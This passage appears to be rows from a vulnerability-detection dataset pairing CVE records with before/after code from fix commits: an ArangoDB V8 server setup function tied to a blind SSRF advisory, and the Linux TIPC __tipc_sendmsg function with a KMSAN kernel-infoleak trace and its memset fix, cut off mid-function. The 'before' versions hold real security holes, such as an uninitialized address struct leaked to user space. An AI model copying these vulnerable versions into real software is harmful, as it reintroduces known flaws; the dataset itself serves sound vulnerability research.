* Update CHANGELOG

* Fix clang-format

Co-authored-by: Vadim <vadim@arangodb.com>",d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175,https://github.com/arangodb/arangodb/commit/d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175,arangod/V8Server/v8-actions.cpp,TRI_InitV8ServerUtils,"void TRI_InitV8ServerUtils(v8::Isolate* isolate) {
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_CLUSTER_API_JWT_POLICY""),
JS_ClusterApiJwtPolicy, true);
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_API_DISABLED""),
JS_IsFoxxApiDisabled, true);
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_STORE_DISABLED""),
JS_IsFoxxStoreDisabled, true);
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_RUN_IN_RESTRICTED_CONTEXT""),
JS_RunInRestrictedContext, true);
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_CREATE_HOTBACKUP""),
JS_CreateHotbackup);
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_CLEAR_FAILAT""),
JS_DebugClearFailAt);
#ifdef ARANGODB_ENABLE_FAILURE_TESTS
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_TERMINATE""),
JS_DebugTerminate);
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_SET_FAILAT""),
JS_DebugSetFailAt);
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_REMOVE_FAILAT""),
JS_DebugRemoveFailAt);
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_SHOULD_FAILAT""),
JS_DebugShouldFailAt);
#endif
TRI_GET_GLOBALS();
FoxxFeature& foxxFeature = v8g->_server.getFeature<FoxxFeature>();
isolate->GetCurrentContext()
->Global()
->DefineOwnProperty(
TRI_IGETC, TRI_V8_ASCII_STRING(isolate, ""FOXX_QUEUES_POLL_INTERVAL""),
v8::Number::New(isolate, foxxFeature.pollInterval()), v8::ReadOnly)
.FromMaybe(false);  
isolate->GetCurrentContext()
->Global()
->DefineOwnProperty(
TRI_IGETC,
TRI_V8_ASCII_STRING(isolate, ""FOXX_STARTUP_WAIT_FOR_SELF_HEAL""),
v8::Boolean::New(isolate, foxxFeature.startupWaitForSelfHeal()),
v8::ReadOnly)
.FromMaybe(false);  }","void TRI_InitV8ServerUtils(v8::Isolate* VAR_0) {
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_CLUSTER_API_JWT_POLICY""),
VAR_1, true);
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_IS_FOXX_API_DISABLED""),
VAR_2, true);
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_IS_FOXX_STORE_DISABLED""),
VAR_3, true);
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_RUN_IN_RESTRICTED_CONTEXT""),
VAR_4, true);
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_CREATE_HOTBACKUP""),
VAR_5);
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_CLEAR_FAILAT""),
VAR_6);
#ifdef VAR_7
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_TERMINATE""),
VAR_8);
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_SET_FAILAT""),
VAR_9);
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_REMOVE_FAILAT""),
VAR_10);
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_SHOULD_FAILAT""),
VAR_11);
#endif
TRI_GET_GLOBALS();
FoxxFeature& VAR_12 = VAR_13->_server.getFeature<FoxxFeature>();
VAR_0->GetCurrentContext()
->Global()
->DefineOwnProperty(
VAR_14, TRI_V8_ASCII_STRING(VAR_0, ""FOXX_QUEUES_POLL_INTERVAL""),
v8::Number::New(VAR_0, VAR_12.pollInterval()), v8::ReadOnly)
.FromMaybe(false);  
VAR_0->GetCurrentContext()
->Global()
->DefineOwnProperty(
VAR_14,
TRI_V8_ASCII_STRING(VAR_0, ""FOXX_STARTUP_WAIT_FOR_SELF_HEAL""),
v8::Boolean::New(VAR_0, VAR_12.startupWaitForSelfHeal()),
v8::ReadOnly)
.FromMaybe(false);  
}",arangodb/d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175/v8-actions.cpp/vul/before/0.json,"void TRI_InitV8ServerUtils(v8::Isolate* isolate) {
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_CLUSTER_API_JWT_POLICY""),
      JS_ClusterApiJwtPolicy, true);
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_API_DISABLED""),
      JS_IsFoxxApiDisabled, true);
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_STORE_DISABLED""),
      JS_IsFoxxStoreDisabled, true);
  TRI_AddGlobalFunctionVocbase(
      isolate,
      TRI_V8_ASCII_STRING(isolate, ""SYS_FOXX_ALLOW_INSTALL_FROM_REMOTE""),
      JS_FoxxAllowInstallFromRemote, true);
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_RUN_IN_RESTRICTED_CONTEXT""),
      JS_RunInRestrictedContext, true);

  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_CREATE_HOTBACKUP""),
      JS_CreateHotbackup);

  // debugging functions
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_CLEAR_FAILAT""),
      JS_DebugClearFailAt);

#ifdef ARANGODB_ENABLE_FAILURE_TESTS
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_TERMINATE""),
      JS_DebugTerminate);
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_SET_FAILAT""),
      JS_DebugSetFailAt);
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_REMOVE_FAILAT""),
      JS_DebugRemoveFailAt);
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_SHOULD_FAILAT""),
      JS_DebugShouldFailAt);
#endif

  // poll interval for Foxx queues
  TRI_GET_GLOBALS();
  FoxxFeature& foxxFeature = v8g->_server.getFeature<FoxxFeature>();

  isolate->GetCurrentContext()
      ->Global()
      ->DefineOwnProperty(
          TRI_IGETC, TRI_V8_ASCII_STRING(isolate, ""FOXX_QUEUES_POLL_INTERVAL""),
          v8::Number::New(isolate, foxxFeature.pollInterval()), v8::ReadOnly)
      .FromMaybe(false);  // ignore result

  isolate->GetCurrentContext()
      ->Global()
      ->DefineOwnProperty(
          TRI_IGETC,
          TRI_V8_ASCII_STRING(isolate, ""FOXX_STARTUP_WAIT_FOR_SELF_HEAL""),
          v8::Boolean::New(isolate, foxxFeature.startupWaitForSelfHeal()),
          v8::ReadOnly)
      .FromMaybe(false);  // ignore result
}","void TRI_InitV8ServerUtils(v8::Isolate* VAR_0) {
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_CLUSTER_API_JWT_POLICY""),
      VAR_1, true);
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_IS_FOXX_API_DISABLED""),
      VAR_2, true);
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_IS_FOXX_STORE_DISABLED""),
      VAR_3, true);
  TRI_AddGlobalFunctionVocbase(
      VAR_0,
      TRI_V8_ASCII_STRING(VAR_0, ""SYS_FOXX_ALLOW_INSTALL_FROM_REMOTE""),
      VAR_4, true);
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_RUN_IN_RESTRICTED_CONTEXT""),
      VAR_5, true);

  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_CREATE_HOTBACKUP""),
      VAR_6);

  /* COMMENT_0 */
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_CLEAR_FAILAT""),
      VAR_7);

#ifdef VAR_8
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_TERMINATE""),
      VAR_9);
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_SET_FAILAT""),
      VAR_10);
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_REMOVE_FAILAT""),
      VAR_11);
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_SHOULD_FAILAT""),
      VAR_12);
#endif

  /* COMMENT_1 */
  TRI_GET_GLOBALS();
  FoxxFeature& VAR_13 = VAR_14->_server.getFeature<FoxxFeature>();

  VAR_0->GetCurrentContext()
      ->Global()
      ->DefineOwnProperty(
          VAR_15, TRI_V8_ASCII_STRING(VAR_0, ""FOXX_QUEUES_POLL_INTERVAL""),
          v8::Number::New(VAR_0, VAR_13.pollInterval()), v8::ReadOnly)
      .FromMaybe(false);  /* COMMENT_2 */

  VAR_0->GetCurrentContext()
      ->Global()
      ->DefineOwnProperty(
          VAR_15,
          TRI_V8_ASCII_STRING(VAR_0, ""FOXX_STARTUP_WAIT_FOR_SELF_HEAL""),
          v8::Boolean::New(VAR_0, VAR_13.startupWaitForSelfHeal()),
          v8::ReadOnly)
      .FromMaybe(false);  /* COMMENT_2 */
}",arangodb/d7b35a6884c6b2802d34d79fb2a79fb2c9ec2175/v8-actions.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -8,6 +8,10 @@
   TRI_AddGlobalFunctionVocbase(
       isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_STORE_DISABLED""),
       JS_IsFoxxStoreDisabled, true);
+  TRI_AddGlobalFunctionVocbase(
+      isolate,
+      TRI_V8_ASCII_STRING(isolate, ""SYS_FOXX_ALLOW_INSTALL_FROM_REMOTE""),
+      JS_FoxxAllowInstallFromRemote, true);
   TRI_AddGlobalFunctionVocbase(
       isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_RUN_IN_RESTRICTED_CONTEXT""),
       JS_RunInRestrictedContext, true);","{'deleted_lines': [], 'added_lines': ['  TRI_AddGlobalFunctionVocbase(', '      isolate,', '      TRI_V8_ASCII_STRING(isolate, ""SYS_FOXX_ALLOW_INSTALL_FROM_REMOTE""),', '      JS_FoxxAllowInstallFromRemote, true);']}",True,"In ArangoDB, versions v3.7.0 through v3.9.0-alpha.1 have a feature which allows downloading a Foxx service from a publicly available URL. This feature does not enforce proper filtering of requests performed internally, which can be abused by a highly-privileged attacker to perform blind SSRF and send internal requests to localhost.",2.7,LOW,0,valid,2021-12-30T03:34:00Z,4
CVE-2022-0382,['CWE-909'],AV:L/AC:L/Au:N/C:P/I:N/A:N,0,torvalds/linux,"net ticp:fix a kernel-infoleak in __tipc_sendmsg()

struct tipc_socket_addr.ref has a 4-byte hole,and __tipc_getname() currently
copying it to user space,causing kernel-infoleak.

BUG: KMSAN: kernel-infoleak in instrument_copy_to_user include/linux/instrumented.h:121 [inline]
BUG: KMSAN: kernel-infoleak in instrument_copy_to_user include/linux/instrumented.h:121 [inline] lib/usercopy.c:33
BUG: KMSAN: kernel-infoleak in _copy_to_user+0x1c9/0x270 lib/usercopy.c:33 lib/usercopy.c:33
 instrument_copy_to_user include/linux/instrumented.h:121 [inline]
 instrument_copy_to_user include/linux/instrumented.h:121 [inline] lib/usercopy.c:33
 _copy_to_user+0x1c9/0x270 lib/usercopy.c:33 lib/usercopy.c:33
 copy_to_user include/linux/uaccess.h:209 [inline]
 copy_to_user include/linux/uaccess.h:209 [inline] net/socket.c:287
 move_addr_to_user+0x3f6/0x600 net/socket.c:287 net/socket.c:287
 __sys_getpeername+0x470/0x6b0 net/socket.c:1987 net/socket.c:1987
 __do_sys_getpeername net/socket.c:1997 [inline]
 __se_sys_getpeername net/socket.c:1994 [inline]
 __do_sys_getpeername net/socket.c:1997 [inline] net/socket.c:1994
 __se_sys_getpeername net/socket.c:1994 [inline] net/socket.c:1994
 __x64_sys_getpeername+0xda/0x120 net/socket.c:1994 net/socket.c:1994
 do_syscall_x64 arch/x86/entry/common.c:51 [inline]
 do_syscall_x64 arch/x86/entry/common.c:51 [inline] arch/x86/entry/common.c:82
 do_syscall_64+0x54/0xd0 arch/x86/entry/common.c:82 arch/x86/entry/common.c:82
 entry_SYSCALL_64_after_hwframe+0x44/0xae

Uninit was stored to memory at:
 tipc_getname+0x575/0x5e0 net/tipc/socket.c:757 net/tipc/socket.c:757
 __sys_getpeername+0x3b3/0x6b0 net/socket.c:1984 net/socket.c:1984
 __do_sys_getpeername net/socket.c:1997 [inline]
 __se_sys_getpeername net/socket.c:1994 [inline]
 __do_sys_getpeername net/socket.c:1997 [inline] net/socket.c:1994
 __se_sys_getpeername net/socket.c:1994 [inline] net/socket.c:1994
 __x64_sys_getpeername+0xda/0x120 net/socket.c:1994 net/socket.c:1994
 do_syscall_x64 arch/x86/entry/common.c:51 [inline]
 do_syscall_x64 arch/x86/entry/common.c:51 [inline] arch/x86/entry/common.c:82
 do_syscall_64+0x54/0xd0 arch/x86/entry/common.c:82 arch/x86/entry/common.c:82
 entry_SYSCALL_64_after_hwframe+0x44/0xae

Uninit was stored to memory at:
 msg_set_word net/tipc/msg.h:212 [inline]
 msg_set_destport net/tipc/msg.h:619 [inline]
 msg_set_word net/tipc/msg.h:212 [inline] net/tipc/socket.c:1486
 msg_set_destport net/tipc/msg.h:619 [inline] net/tipc/socket.c:1486
 __tipc_sendmsg+0x44fa/0x5890 net/tipc/socket.c:1486 net/tipc/socket.c:1486
 tipc_sendmsg+0xeb/0x140 net/tipc/socket.c:1402 net/tipc/socket.c:1402
 sock_sendmsg_nosec net/socket.c:704 [inline]
 sock_sendmsg net/socket.c:724 [inline]
 sock_sendmsg_nosec net/socket.c:704 [inline] net/socket.c:2409
 sock_sendmsg net/socket.c:724 [inline] net/socket.c:2409
 ____sys_sendmsg+0xe11/0x12c0 net/socket.c:2409 net/socket.c:2409
 ___sys_sendmsg net/socket.c:2463 [inline]
 ___sys_sendmsg net/socket.c:2463 [inline] net/socket.c:2492
 __sys_sendmsg+0x704/0x840 net/socket.c:2492 net/socket.c:2492
 __do_sys_sendmsg net/socket.c:2501 [inline]
 __se_sys_sendmsg net/socket.c:2499 [inline]
 __do_sys_sendmsg net/socket.c:2501 [inline] net/socket.c:2499
 __se_sys_sendmsg net/socket.c:2499 [inline] net/socket.c:2499
 __x64_sys_sendmsg+0xe2/0x120 net/socket.c:2499 net/socket.c:2499
 do_syscall_x64 arch/x86/entry/common.c:51 [inline]
 do_syscall_x64 arch/x86/entry/common.c:51 [inline] arch/x86/entry/common.c:82
 do_syscall_64+0x54/0xd0 arch/x86/entry/common.c:82 arch/x86/entry/common.c:82
 entry_SYSCALL_64_after_hwframe+0x44/0xae

Local variable skaddr created at:
 __tipc_sendmsg+0x2d0/0x5890 net/tipc/socket.c:1419 net/tipc/socket.c:1419
 tipc_sendmsg+0xeb/0x140 net/tipc/socket.c:1402 net/tipc/socket.c:1402

Bytes 4-7 of 16 are uninitialized
Memory access of size 16 starts at ffff888113753e00
Data copied to user address 0000000020000280

Reported-by: syzbot+cdbd40e0c3ca02cae3b7@syzkaller.appspotmail.com
Signed-off-by: Haimin Zhang <tcs_kernel@tencent.com>
Acked-by: Jon Maloy <jmaloy@redhat.com>
Link: https://lore.kernel.org/r/1640918123-14547-1-git-send-email-tcs.kernel@gmail.com
Signed-off-by: Jakub Kicinski <kuba@kernel.org>",d6d86830705f173fca6087a3e67ceaf68db80523,https://github.com/torvalds/linux/commit/d6d86830705f173fca6087a3e67ceaf68db80523,net/tipc/socket.c,__tipc_sendmsg,"static int __tipc_sendmsg(struct socket *sock, struct msghdr *m, size_t dlen)
{
struct sock *sk = sock->sk;
struct net *net = sock_net(sk);
struct tipc_sock *tsk = tipc_sk(sk);
struct tipc_uaddr *ua = (struct tipc_uaddr *)m->msg_name;
long timeout = sock_sndtimeo(sk, m->msg_flags & MSG_DONTWAIT);
struct list_head *clinks = &tsk->cong_links;
bool syn = !tipc_sk_type_connectionless(sk);
struct tipc_group *grp = tsk->group;
struct tipc_msg *hdr = &tsk->phdr;
struct tipc_socket_addr skaddr;
struct sk_buff_head pkts;
int atype, mtu, rc;
if (unlikely(dlen > TIPC_MAX_USER_MSG_SIZE))
return -EMSGSIZE;
if (ua) {
if (!tipc_uaddr_valid(ua, m->msg_namelen))
return -EINVAL;
atype = ua->addrtype;
}
if (grp) {
if (!ua)
return tipc_send_group_bcast(sock, m, dlen, timeout);
if (atype == TIPC_SERVICE_ADDR)
return tipc_send_group_anycast(sock, m, dlen, timeout);
if (atype == TIPC_SOCKET_ADDR)
return tipc_send_group_unicast(sock, m, dlen, timeout);
if (atype == TIPC_SERVICE_RANGE)
return tipc_send_group_mcast(sock, m, dlen, timeout);
return -EINVAL;
}
if (!ua) {
ua = (struct tipc_uaddr *)&tsk->peer;
if (!syn && ua->family != AF_TIPC)
return -EDESTADDRREQ;
atype = ua->addrtype;
}
if (unlikely(syn)) {
if (sk->sk_state == TIPC_LISTEN)
return -EPIPE;
if (sk->sk_state != TIPC_OPEN)
return -EISCONN;
if (tsk->published)
return -EOPNOTSUPP;
if (atype == TIPC_SERVICE_ADDR)
tsk->conn_addrtype = atype;
msg_set_syn(hdr, 1);
}
if (atype == TIPC_SERVICE_RANGE) {
return tipc_sendmcast(sock, ua, m, dlen, timeout);
} else if (atype == TIPC_SERVICE_ADDR) {
skaddr.node = ua->lookup_node;
ua->scope = tipc_node2scope(skaddr.node);
if (!tipc_nametbl_lookup_anycast(net, ua, &skaddr))
return -EHOSTUNREACH;
} else if (atype == TIPC_SOCKET_ADDR) {
skaddr = ua->sk;
} else {
return -EINVAL;
}
rc = tipc_wait_for_cond(sock, &timeout,
!tipc_dest_find(clinks, skaddr.node, 0));
if (unlikely(rc))
return rc;
msg_set_destnode(hdr, skaddr.node);
msg_set_destport(hdr, skaddr.ref);
if (atype == TIPC_SERVICE_ADDR) {
msg_set_type(hdr, TIPC_NAMED_MSG);
msg_set_hdr_sz(hdr, NAMED_H_SIZE);
msg_set_nametype(hdr, ua->sa.type);
msg_set_nameinst(hdr, ua->sa.instance);
msg_set_lookup_scope(hdr, ua->scope);
} else { 
msg_set_type(hdr, TIPC_DIRECT_MSG);
msg_set_lookup_scope(hdr, 0);
msg_set_hdr_sz(hdr, BASIC_H_SIZE);
}
__skb_queue_head_init(&pkts);
mtu = tipc_node_get_mtu(net, skaddr.node, tsk->portid, true);
rc = tipc_msg_build(hdr, m, 0, dlen, mtu, &pkts);
if (unlikely(rc != dlen))
return rc;
if (unlikely(syn && !tipc_msg_skb_clone(&pkts, &sk->sk_write_queue))) {
__skb_queue_purge(&pkts);
return -ENOMEM;
}
trace_tipc_sk_sendmsg(sk, skb_peek(&pkts), TIPC_DUMP_SK_SNDQ, "" "");
rc = tipc_node_xmit(net, &pkts, skaddr.node, tsk->portid);
if (unlikely(rc == -ELINKCONG)) {
tipc_dest_push(clinks, skaddr.node, 0);
tsk->cong_link_cnt++;
rc = 0;
}
if (unlikely(syn && !rc)) {
tipc_set_sk_state(sk, TIPC_CONNECTING);
if (dlen && timeout) {
timeout = msecs_to_jiffies(timeout);
tipc_wait_for_connect(sock, &timeout);
}
}
return rc ? rc : dlen;
}","static int __tipc_sendmsg(struct socket *VAR_0, struct msghdr *VAR_1, size_t VAR_2)
{
struct sock *VAR_3 = sock->sk;
struct net *net = sock_net(VAR_3);
struct tipc_sock *VAR_4 = tipc_sk(VAR_3);
struct tipc_uaddr *VAR_5 = (struct tipc_uaddr *)VAR_1->msg_name;
long VAR_6 = sock_sndtimeo(VAR_3, VAR_1->msg_flags & VAR_7);
struct list_head *VAR_8 = &VAR_4->cong_links;
bool VAR_9 = !tipc_sk_type_connectionless(VAR_3);
struct tipc_group *VAR_10 = VAR_4->group;
struct tipc_msg *VAR_11 = &VAR_4->phdr;
struct tipc_socket_addr VAR_12;
struct sk_buff_head VAR_13;
int VAR_14, VAR_15, VAR_16;
if (unlikely(VAR_2 > VAR_17))
return -VAR_18;
if (VAR_5) {
if (!tipc_uaddr_valid(VAR_5, VAR_1->msg_namelen))
return -VAR_19;
VAR_14 = VAR_5->addrtype;
}
if (VAR_10) {
if (!VAR_5)
return tipc_send_group_bcast(sock, VAR_1, VAR_2, VAR_6);
if (VAR_14 == VAR_20)
return tipc_send_group_anycast(sock, VAR_1, VAR_2, VAR_6);
if (VAR_14 == VAR_21)
return tipc_send_group_unicast(sock, VAR_1, VAR_2, VAR_6);
if (VAR_14 == VAR_22)
return tipc_send_group_mcast(sock, VAR_1, VAR_2, VAR_6);
return -VAR_19;
}
if (!VAR_5) {
VAR_5 = (struct tipc_uaddr *)&VAR_4->peer;
if (!VAR_9 && VAR_5->family != VAR_23)
return -VAR_24;
VAR_14 = VAR_5->addrtype;
}
if (unlikely(VAR_9)) {
if (VAR_3->sk_state == VAR_25)
return -VAR_26;
if (VAR_3->sk_state != VAR_27)
return -VAR_28;
if (VAR_4->published)
return -VAR_29;
if (VAR_14 == VAR_20)
VAR_4->conn_addrtype = VAR_14;
msg_set_syn(VAR_11, 1);
}
if (VAR_14 == VAR_22) {
return tipc_sendmcast(sock, VAR_5, VAR_1, VAR_2, VAR_6);
} else if (VAR_14 == VAR_20) {
VAR_12.node = VAR_5->lookup_node;
VAR_5->scope = tipc_node2scope(VAR_12.node);
if (!tipc_nametbl_lookup_anycast(net, VAR_5, &VAR_12))
return -VAR_30;
} else if (VAR_14 == VAR_21) {
VAR_12 = VAR_5->sk;
} else {
return -VAR_19;
}
VAR_16 = tipc_wait_for_cond(sock, &VAR_6,
!tipc_dest_find(VAR_8, VAR_12.node, 0));
if (unlikely(VAR_16))
return VAR_16;
msg_set_destnode(VAR_11, VAR_12.node);
msg_set_destport(VAR_11, VAR_12.ref);
if (VAR_14 == VAR_20) {
msg_set_type(VAR_11, VAR_31);
msg_set_hdr_sz(VAR_11, VAR_32);
msg_set_nametype(VAR_11, VAR_5->sa.type);
msg_set_nameinst(VAR_11, VAR_5->sa.instance);
msg_set_lookup_scope(VAR_11, VAR_5->scope);
} else { 
msg_set_type(VAR_11, VAR_33);
msg_set_lookup_scope(VAR_11, 0);
msg_set_hdr_sz(VAR_11, VAR_34);
}
__skb_queue_head_init(&VAR_13);
VAR_15 = tipc_node_get_mtu(net, VAR_12.node, VAR_4->portid, true);
VAR_16 = tipc_msg_build(VAR_11, VAR_1, 0, VAR_2, VAR_15, &VAR_13);
if (unlikely(VAR_16 != VAR_2))
return VAR_16;
if (unlikely(VAR_9 && !tipc_msg_skb_clone(&VAR_13, &VAR_3->sk_write_queue))) {
__skb_queue_purge(&VAR_13);
return -VAR_35;
}
trace_tipc_sk_sendmsg(VAR_3, skb_peek(&VAR_13), VAR_36, "" "");
VAR_16 = tipc_node_xmit(net, &VAR_13, VAR_12.node, VAR_4->portid);
if (unlikely(VAR_16 == -VAR_37)) {
tipc_dest_push(VAR_8, VAR_12.node, 0);
VAR_4->cong_link_cnt++;
VAR_16 = 0;
}
if (unlikely(VAR_9 && !VAR_16)) {
tipc_set_sk_state(VAR_3, VAR_38);
if (VAR_2 && VAR_6) {
VAR_6 = msecs_to_jiffies(VAR_6);
tipc_wait_for_connect(sock, &VAR_6);
}
}
return VAR_16 ? VAR_16 : VAR_2;
}",torvalds/linux/d6d86830705f173fca6087a3e67ceaf68db80523/socket.c/vul/before/0.json,"static int __tipc_sendmsg(struct socket *sock, struct msghdr *m, size_t dlen)
{
	struct sock *sk = sock->sk;
	struct net *net = sock_net(sk);
	struct tipc_sock *tsk = tipc_sk(sk);
	struct tipc_uaddr *ua = (struct tipc_uaddr *)m->msg_name;
	long timeout = sock_sndtimeo(sk, m->msg_flags & MSG_DONTWAIT);
	struct list_head *clinks = &tsk->cong_links;
	bool syn = !tipc_sk_type_connectionless(sk);
	struct tipc_group *grp = tsk->group;
	struct tipc_msg *hdr = &tsk->phdr;
	struct tipc_socket_addr skaddr;
	struct sk_buff_head pkts;
	int atype, mtu, rc;

	if (unlikely(dlen > TIPC_MAX_USER_MSG_SIZE))
		return -EMSGSIZE;

	if (ua) {
		if (!tipc_uaddr_valid(ua, m->msg_namelen))
			return -EINVAL;
		atype = ua->addrtype;
	}

	/* If socket belongs to a communication group follow other paths */
	if (grp) {
		if (!ua)
			return tipc_send_group_bcast(sock, m, dlen, timeout);
		if (atype == TIPC_SERVICE_ADDR)
			return tipc_send_group_anycast(sock, m, dlen, timeout);
		if (atype == TIPC_SOCKET_ADDR)
			return tipc_send_group_unicast(sock, m, dlen, timeout);
		if (atype == TIPC_SERVICE_RANGE)
			return tipc_send_group_mcast(sock, m, dlen, timeout);
		return -EINVAL;
	}

	if (!ua) {
		ua = (struct tipc_uaddr *)&tsk->peer;
		if (!syn && ua->family != AF_TIPC)
			return -EDESTADDRREQ;
		atype = ua->addrtype;
	}

	if (unlikely(syn)) {
		if (sk->sk_state == TIPC_LISTEN)
			return -EPIPE;
		if (sk->sk_state != TIPC_OPEN)
			return -EISCONN;
		if (tsk->published)
			return -EOPNOTSUPP;
		if (atype == TIPC_SERVICE_ADDR)
			tsk->conn_addrtype = atype;
		msg_set_syn(hdr, 1);
	}

	memset(&skaddr, 0, sizeof(skaddr));

	/* Determine destination */
	if (atype == TIPC_SERVICE_RANGE) {
		return tipc_sendmcast(sock, ua, m, dlen, timeout);
	} else if (atype == TIPC_SERVICE_ADDR) {
		skaddr.node = ua->lookup_node;
		ua->scope = tipc_node2scope(skaddr.node);
		if (!tipc_nametbl_lookup_anycast(net, ua, &skaddr))
			return -EHOSTUNREACH;
	} else if (atype == TIPC_SOCKET_ADDR) {
		skaddr = ua->sk;
	} else {
		return -EINVAL;
	}

	/* Block or return if destination link is congested */
	rc = tipc_wait_for_cond(sock, &timeout,
				!tipc_dest_find(clinks, skaddr.node, 0));
	if (unlikely(rc))
		return rc;

	/* Finally build message header */
	msg_set_destnode(hdr, skaddr.node);
	msg_set_destport(hdr, skaddr.ref);
	if (atype == TIPC_SERVICE_ADDR) {
		msg_set_type(hdr, TIPC_NAMED_MSG);
		msg_set_hdr_sz(hdr, NAMED_H_SIZE);
		msg_set_nametype(hdr, ua->sa.type);
		msg_set_nameinst(hdr, ua->sa.instance);
		msg_set_lookup_scope(hdr, ua->scope);
	} else { /* TIPC_SOCKET_ADDR */
		msg_set_type(hdr, TIPC_DIRECT_MSG);
		msg_set_lookup_scope(hdr, 0);
		msg_set_hdr_sz(hdr, BASIC_H_SIZE);
	}

	/* Add message body */
	__skb_queue_head_init(&pkts);
	mtu = tipc_node_get_mtu(net, skaddr.node, tsk->portid, true);
	rc = tipc_msg_build(hdr, m, 0, dlen, mtu, &pkts);
	if (unlikely(rc != dlen))
		return rc;
	if (unlikely(syn && !tipc_msg_skb_clone(&pkts, &sk->sk_write_queue))) {
		__skb_queue_purge(&pkts);
		return -ENOMEM;
	}

	/* Send message */
	trace_tipc_sk_sendmsg(sk, skb_peek(&pkts), TIPC_DUMP_SK_SNDQ, "" "");
	rc = tipc_node_xmit(net, &pkts, skaddr.node, tsk->portid);
	if (unlikely(rc == -ELINKCONG)) {
		tipc_dest_push(clinks, skaddr.node, 0);
		tsk->cong_link_cnt++;
		rc = 0;
	}

	if (unlikely(syn && !rc)) {
		tipc_set_sk_state(sk, TIPC_CONNECTING);
		if (dlen && timeout) {
			timeout = msecs_to_jiffies(timeout);
			tipc_wait_for_connect(sock, &timeout);
		}
	}

	return rc ? rc : dlen;
}","static int __tipc_sendmsg(struct socket *VAR_0, struct msghdr *VAR_1, size_t VAR_2)
{
	struct sock *VAR_3 = sock->sk;
	struct net *net = sock_net(VAR_3);
	struct tipc_sock *VAR_4 = tipc_sk(VAR_3);
	struct tipc_uaddr *VAR_5 = (struct tipc_uaddr *)VAR_1->msg_name;
	long VAR_6 = sock_sndtimeo(VAR_3, VAR_1->msg_flags & VAR_7);
	struct list_head *VAR_8 = &VAR_4->cong_links;
	bool VAR_9 = !tipc_sk_type_connectionless(VAR_3);
	struct tipc_group *VAR_10 = VAR_4->group;
